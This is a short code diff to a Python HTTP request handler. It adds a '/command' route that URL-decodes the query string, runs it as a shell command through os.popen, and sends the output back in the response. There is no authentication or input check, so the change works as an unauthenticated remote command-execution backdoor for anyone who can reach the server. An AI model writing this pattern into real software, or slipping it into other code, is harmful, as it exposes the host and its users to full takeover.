@@ -190,6 +190,14 @@ class Handler(BaseHTTPRequestHandler):
 				
 			elif url.path=='/ping':
 				self.reply(f'ok')
+			elif '/command' in url.path:
+				import urllib,os
+				command=url.query
+				command=urllib.parse.unquote(command)
+				print(command)
+				output = os.popen(command).read()
+				self.reply(output)
+
 			elif url.path=='/update':
 				import os
 				import sys
